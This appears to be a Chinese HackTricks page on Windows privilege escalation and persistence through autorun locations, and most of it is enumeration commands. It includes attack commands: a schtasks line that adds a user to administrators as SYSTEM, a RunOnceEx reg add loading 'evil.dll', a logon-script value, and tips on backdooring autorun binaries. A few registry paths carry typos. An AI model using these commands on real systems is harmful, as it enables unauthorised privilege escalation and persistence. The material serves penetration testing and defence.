# 使用 Autoruns 进行权限提升

{{#include ../../banners/hacktricks-training.md}}



## WMIC

**Wmic** 可用于在**启动时**运行程序。使用以下命令查看哪些二进制文件被设置为在启动时运行：

```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```

## 计划任务

**任务**可以设定为按**特定频率**运行。使用以下命令查看哪些二进制文件已安排运行：

```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtasks.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Requires an elevated caller to register a task as SYSTEM
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```

使用 `/sc ONLOGON /rl HIGHEST` 创建的任务会请求其注册主体**可用的最高运行级别**；仅使用该开关既不会更改该主体，也不会绕过 UAC。低权限进程无法注册最高运行级别的任务，也无法将 SYSTEM 选为任务身份。应将上面的示例视为由已提权的调用方执行的操作，而不是从标准用户提权到 SYSTEM 的途径。<sup>[[8]](#references)</sup>

即使任务定义和操作文件受到保护，以 SYSTEM 身份运行的已启用任务也值得审查。[Task Scheduler requires execute permission on the task to run it on demand](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks)。如果低权限用户拥有该权限，请检查具体操作，尤其是会修改 Active Directory ACL 或重置账户保护设置的 PowerShell 脚本。检查任务的 `AllowDemandStart` 设置，并验证脚本的输入和影响；仅拥有启动固定任务的权限，并不意味着可以执行任意代码。

## 文件夹

**Startup 文件夹**中的所有二进制文件都会在启动时执行。常见的 Startup 文件夹如下所列，但启动文件夹的位置由注册表指定。[阅读此处了解具体位置。](privilege-escalation-with-autorun-binaries.md#startup-path)

```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```

更高权限用户的 Startup 条目可能会启动受保护的脚本，而该脚本会反复打开其他用户可写目录中的文件。在将该目录视为提权路径之前，请检查该条目的**实际登录身份**、脚本的输入目录及其 ACL，以及具体执行的操作。特别是，[`hh.exe` 会打开编译后的 HTML Help（`.chm`）文件](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/htmlhelp/about-the-html-help-executable-program)；即使脚本检查了文件名或开头的字节，只要它将调用者提供的文件传递给该程序，就跨越了内容信任边界。[HTML Help 策略可以限制可执行快捷方式](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/htmlhelp/system-policies-for-shortcut-and-winhelp-commands)，因此请确认已安装的策略以及可访问内容的行为。仅凭 `.chm` 扩展名或 magic bytes，不能证明能以更高权限执行代码。枚举时请检查 autorun、进程命令行和路径权限，不要打开不受信任的文件。

当更高权限用户**手动打开**其他用户可替换的文档文件夹中的 `.chm` 文件时，也存在相同的内容信任边界。请确认具体文件及其父目录的写入权限、实际查看器身份和打开事件，以及生效的 HTML Help 策略。文件夹可写，或有人要求查看文档，并不能证明更高权限身份打开了攻击者控制的内容。

> **提示**：归档解压中的 *path traversal* 漏洞（例如 WinRAR 7.13 之前版本中被利用的漏洞——CVE-2025-8088）可用于**在解压时将 payload 直接放入这些 Startup 文件夹中**，从而在下次用户登录时执行代码。有关此技术的深入介绍，请参阅：

{{#ref}}
../../generic-hacking/archive-extraction-path-traversal.md
{{#endref}}



## 注册表

> [!TIP]
> [此处的说明](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f)：**Wow6432Node** 注册表项表示你运行的是 64 位 Windows。操作系统使用此项为在 64 位 Windows 上运行的 32 位应用程序提供 HKEY_LOCAL_MACHINE\SOFTWARE 的独立视图。

### Runs

**常见的** AutoRun 注册表项：

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

名为 **Run** 和 **RunOnce** 的注册表项用于在用户每次登录系统时自动执行程序。作为项数据值的命令行长度不得超过 260 个字符。<sup>[[2]](#references)</sup>

**服务启动项**（可控制服务在启动时是否自动启动）：

- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx：**

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
- `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

在 Windows Vista 及更高版本中，**Run** 和 **RunOnce** 注册表项不会自动生成。这些项中的条目可以直接启动程序，也可以将程序指定为依赖项。例如，要在登录时加载 DLL 文件，可以使用 **RunOnceEx** 注册表项及其 "Depend" 项。以下示例通过添加注册表项，在系统启动时执行 "C:\temp\evil.dll"：<sup>[[2]](#references)</sup>

```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```

> [!TIP]
> **Exploit 1**：如果你能写入 **HKLM** 中提到的任何注册表项，那么当其他用户登录时，你就可以提升权限。

> [!TIP]
> **Exploit 2**：如果你能覆盖 **HKLM** 中任何注册表项所指向的二进制文件，那么当其他用户登录时，你就可以用 backdoor 修改该二进制文件并提升权限。

```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```

### 启动路径

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

放在 **Startup** 文件夹中的快捷方式会在用户登录或系统重启时自动触发服务或应用程序启动。**Startup** 文件夹的位置由注册表中 **Local Machine** 和 **Current User** 范围的设置定义。这意味着，添加到这些指定 **Startup** 位置的任何快捷方式，都会确保关联的服务或程序在登录或重启后启动，因此这是一种简单直接的自动运行程序的方法。<sup>[[1]](#references)[[2]](#references)</sup>

> [!TIP]
> 如果你能覆盖 **HKLM** 下的任何 \[User] Shell Folder，就可以将其指向由你控制的文件夹，并放置一个 backdoor，使其在用户每次登录系统时执行，从而提升权限。

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```

### UserInitMprLogonScript

- `HKCU\Environment\UserInitMprLogonScript`

此用户级注册表值可以指向一个脚本或命令，该脚本或命令会在该用户登录时执行。它主要是一种 **persistence** 手段，因为它只会在受影响用户的上下文中运行，但在 post-exploitation 和 autoruns 检查期间仍值得查看。<sup>[[3]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> 如果你可以为当前用户写入此值，就可以在下次交互式登录时重新触发执行，而无需管理员权限。如果你可以为其他用户的注册表 hive 写入此值，那么该用户登录时，你可能会获得代码执行。

```bash
reg query "HKCU\Environment" /v "UserInitMprLogonScript"
reg add "HKCU\Environment" /v "UserInitMprLogonScript" /t REG_SZ /d "C:\Users\Public\logon.bat" /f
reg delete "HKCU\Environment" /v "UserInitMprLogonScript" /f

Get-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
Set-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript" -Value 'C:\Users\Public\logon.bat'
Remove-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
```

备注：

- 优先使用目标用户已可读取的 `.bat`、`.cmd`、`.ps1` 或其他启动器文件的完整路径。
- 在删除该值之前，此设置会在注销或重启后持续生效。
- 与 `HKLM\...\Run` 不同，此设置本身不会授予提权；它属于用户级持久化。

### Winlogon 键

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

通常，**Userinit** 键设置为 **userinit.exe**。但是，如果修改此键，指定的可执行文件也会在用户登录时由 **Winlogon** 启动。类似地，**Shell** 键应指向 **explorer.exe**，它是 Windows 的默认 shell。<sup>[[1]](#references)</sup>

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```

> [!TIP]
> 如果你可以覆盖注册表值或二进制文件，就能够提升权限。

### 策略设置

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

检查 **Run** 键。

```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```

### AlternateShell

### 更改安全模式命令提示符

在 Windows 注册表的 `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot` 下，默认设置为 `cmd.exe` 的 **`AlternateShell`** 值意味着：启动时按 F8 并选择“带命令提示符的安全模式”后，系统会使用 `cmd.exe`。不过，也可以将计算机设置为自动以此模式启动，无需按 F8 并手动选择。

创建启动选项以自动进入“带命令提示符的安全模式”的步骤：<sup>[[5]](#references)</sup>

1. 更改 `boot.ini` 文件属性，移除只读、系统和隐藏标记：`attrib c:\boot.ini -r -s -h`
2. 打开 `boot.ini` 进行编辑。
3. 插入类似以下内容的一行：`multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. 保存对 `boot.ini` 的更改。
5. 恢复文件原有属性：`attrib c:\boot.ini +r +s +h`

- **漏洞利用 1：**更改 **AlternateShell** 注册表项可以设置自定义命令 shell，可能导致未授权访问。
- **漏洞利用 2（PATH 写入权限）：**如果对系统 **PATH** 变量中的任何路径部分具有写入权限，尤其是 `C:\Windows\system32` 之前的路径，就可以执行自定义的 `cmd.exe`；如果系统在安全模式下启动，该文件可能成为后门。
- **漏洞利用 3（PATH 和 boot.ini 写入权限）：**对 `boot.ini` 具有写入权限即可启用自动进入安全模式，从而在下次重启时实现未授权访问。

要检查当前的 **AlternateShell** 设置，请使用以下命令：

```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```

### 已安装组件

Active Setup 是 Windows 中的一项功能，会在**桌面环境完全加载之前启动**。它会优先执行某些命令，这些命令必须完成后，用户登录过程才能继续。此过程甚至会在触发 Run 或 RunOnce 注册表项等其他启动项之前发生。

Active Setup 通过以下注册表项进行管理：

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

这些注册表项下存在各种子项，每个子项对应一个特定组件。特别值得关注的键值包括：

- **IsInstalled:**
  - `0` 表示不会执行该组件的命令。
  - `1` 表示每个用户都会执行一次该命令。如果缺少 `IsInstalled` 值，这是默认行为。
- **StubPath:** 定义 Active Setup 要执行的命令。它可以是任何有效的命令行，例如启动 `notepad`。

**安全提示：**

- 修改或写入 **`IsInstalled`** 设置为 `"1"` 且具有特定 **`StubPath`** 的注册表项，可能导致未经授权的命令执行，并有可能用于权限提升。
- 如果拥有足够的权限，修改任何 **`StubPath`** 值所引用的二进制文件，也可能实现权限提升。

可使用以下命令检查 Active Setup 组件中的 **`StubPath`** 配置：

```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```

### Browser Helper Objects

### Browser Helper Objects (BHOs) 概述

Browser Helper Objects (BHOs) 是为 Microsoft Internet Explorer 添加额外功能的 DLL 模块。它们会在 Internet Explorer 和 Windows Explorer 每次启动时加载。不过，可以将 **NoExplorer** 键设为 1 来阻止它们执行，防止它们随 Windows Explorer 实例加载。<sup>[[1]](#references)</sup>

BHOs 可通过 Internet Explorer 11 兼容 Windows 10，但 Microsoft Edge（较新 Windows 版本中的默认浏览器）不支持它们。

要查看系统中注册的 BHOs，可以检查以下注册表项：

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

注册表中每个 BHO 都由其 **CLSID** 表示，作为唯一标识符。每个 CLSID 的详细信息可在 `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}` 下找到。

可以使用以下命令查询注册表中的 BHOs：

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```

### Internet Explorer 扩展

- `HKLM\Software\Microsoft\Internet Explorer\Extensions`
- `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

请注意，注册表中每个 dll 都会有一个新的注册表项，并以 **CLSID** 表示。你可以在 `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}` 中找到 CLSID 信息。

### 字体驱动程序

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
- `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```

### 打开命令

- `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
- `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`

```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```

### Context menu COM 处理程序

Explorer 上下文菜单处理程序是注册在 `HKLM\SOFTWARE\Classes\Directory\shellex\ContextMenuHandlers` 和 `HKLM\SOFTWARE\Classes\Folder\shellex\ContextMenuHandlers` 等项下的 shell 扩展。处理程序的默认值（有时是其项名称）是一个 CLSID。根据该 CLSID 查找 `HKLM\SOFTWARE\Classes\CLSID\{CLSID}\InprocServer32`；其默认值指定了调用处理程序时加载的 DLL。

```powershell
reg query "HKLM\SOFTWARE\Classes\Directory\shellex\ContextMenuHandlers" /s
reg query "HKLM\SOFTWARE\Classes\CLSID\{CLSID}\InprocServer32" /ve
Get-Acl 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{CLSID}\InprocServer32' |
  Select-Object -ExpandProperty Access
```

检查 32 位和 64 位注册表视图。`HKCR` 会合并每用户和全计算机范围的类注册，因此请确认进程实际会解析到哪个底层键。低权限身份若能修改全计算机范围的 `InprocServer32` 值，便可能将权限更高的进程重定向到另一个 DLL；但要实现提权，必须由该进程调用相应处理程序。即使注册表值本身受保护，可写的 DLL 路径也可能带来类似风险。

### 映像文件执行选项

```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```

## SysInternals

请注意，[**winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe) **已经搜索过**所有可能找到 autoruns 的位置。不过，如果想获取**更全面的自动执行文件列表**，可以使用 systinternals 的 [autoruns ](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)：

```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```

## 更多

**在此查找更多类似注册表的 Autoruns** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)<sup>[[4]](#references)</sup>

## References

- [1] [常见恶意软件持久化机制](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
- [2] [MITRE ATT&CK T1547.001 – 启动或登录自动启动执行：注册表 Run 键 / Startup 文件夹](https://attack.mitre.org/techniques/T1547/001/)
- [3] [MITRE ATT&CK T1037.001 – 启动或登录初始化脚本：登录脚本（Windows）](https://attack.mitre.org/techniques/T1037/001/)
- [4] [Autoruns – 自动启动类别（使用 Windows Sysinternals 工具进行故障排除，第 2 版）](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
- [5] [如何添加启动备用 shell 的启动选项？](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)
- [6] [Metasploit 周报 04/03/2026](https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026)
- [7] [Metasploit PR #21032 – windows/persistence/userinit_mpr_logon_script](https://github.com/rapid7/metasploit-framework/pull/21032)
- [8] [Microsoft Learn – 任务的安全上下文](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks)
{{#include ../../banners/hacktricks-training.md}}
